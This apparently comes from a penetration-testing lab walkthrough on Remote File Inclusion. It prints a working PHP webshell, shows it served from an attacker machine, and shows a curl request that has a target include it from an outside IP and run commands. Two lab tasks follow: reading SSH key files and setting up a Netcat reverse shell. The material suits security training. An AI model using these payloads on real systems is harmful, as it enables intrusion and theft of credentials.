# Remote File Inclusion (RFI)

Location and contents of the simple-backdoor.php webshell
>``` shell
>kali@kali:~$ cat simple-backdoor.php
>
># ========== Expected Result ==========
>...
><?php
>if(isset($_REQUEST['cmd'])){
>        echo "<pre>";
>        $cmd = ($_REQUEST['cmd']);
>        system($cmd);
>        echo "</pre>";
>        die;
>}
>?>
>
>Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd
>...
># =====================================
>```

Starting the Python3 http.server module
>``` shell
>kali@kali:/usr/share/webshells/php/$ python3 -m http.server 80
>
># ========== Expected Result ==========
>Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
># =====================================
>```

Exploiting RFI with a PHP backdoor and execution of ls
>``` shell
>kali@kali:/usr/share/webshells/php/$ curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.119.3/simple-backdoor.php&cmd=ls"
>
># ========== Expected Result ==========
>...
><a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
><!-- Simple PHP backdoor by DK (http://michaeldaw.org) --> 
>
><pre>admin.php
>bavarian.php
>css
>fonts
>img
>index.php
>js
></pre>  
># =====================================
>```

Lab 1 - Follow the steps from this section to leverage the RFI on port 80 to remotely include the /usr/share/webshells/php/simple-backdoor.php PHP file. Use the "cmd" parameter to execute commands on VM #1 and use the cat command to view the contents of the authorized_keys file in the /home/elaine/.ssh/ directory. The file contains one entry including a restriction for allowed commands. Find the flag specified as the value to the command parameter in this file.
>``` shell
>
>```
>

Lab 2 - Instead of including the /usr/share/webshells/php/simple-backdoor.php webshell, include the PHP reverse shell from Pentestmonkey's Github repository. Change the $ip variable to the IP of your Kali machine and $port to 4444. Start a Netcat listener on port 4444 on your Kali machine and exploit the RFI vulnerability on port 8001 to include the PHP reverse shell. Find the flag in the /home/guybrush/.treasure/flag.txt file.
>``` shell
>
>```
>
